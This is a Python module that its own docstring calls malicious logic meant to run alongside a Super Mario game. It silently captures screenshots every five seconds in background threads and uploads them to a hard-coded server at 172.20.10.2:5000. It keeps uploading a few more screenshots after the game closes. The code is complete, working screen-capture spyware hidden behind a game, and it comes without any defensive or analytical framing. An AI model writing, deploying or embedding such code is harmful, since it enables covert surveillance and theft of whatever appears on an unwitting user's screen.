# source/custom_logic.py

"""
Custom malicious logic that runs alongside the Super Mario game.
It silently takes screenshots and uploads them to the attacker's server.
"""

import time
import io
import threading
import requests
from PIL import ImageGrab   # For taking screenshots


SERVER_URL = "http://172.20.10.2:5000"

# Only run every 5 seconds
_last_log_time = 0


# -----------------------------
# Background Screenshot Thread
# -----------------------------
def send_screenshot():
    """ Takes a screenshot and uploads it to the server. """
    try:
        # Capture screenshot
        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)

        # Upload to server
        files = {"file": ("screenshot.png", buffer, "image/png")}
        requests.post(SERVER_URL, files=files, timeout=8)

        print("[custom_logic] Screenshot uploaded")

    except Exception as e:
        print(f"[custom_logic] Upload error: {e}")


# -----------------------------
# Called repeatedly WHILE game runs
# -----------------------------
def run_during_game(current_time_ms: int) -> None:
    """
    Called repeatedly while the game is running.
    We trigger screenshot uploads every 5 seconds.
    """
    global _last_log_time

    # Run every 5 seconds = 5000 ms
    if current_time_ms - _last_log_time >= 5000:
        _last_log_time = current_time_ms

        # Start background upload thread
        threading.Thread(target=send_screenshot, daemon=True).start()

        print(f"[custom_logic] Screenshot triggered at {current_time_ms} ms")


# -----------------------------
# Code executed AFTER game closes
# -----------------------------
def run_after_game_ends() -> None:
    """
    Called ONCE after game window closes.
    We continue sending screenshots a few more times.
    """
    print("[custom_logic] Game ended. Running post-exit logic...")

    # Keep sending a few more screenshots after exit
    for i in range(3):
        print(f"[custom_logic] Post-exit screenshot {i+1}")
        send_screenshot()
        time.sleep(5)

    print("[custom_logic] Post-game custom logic finished.")
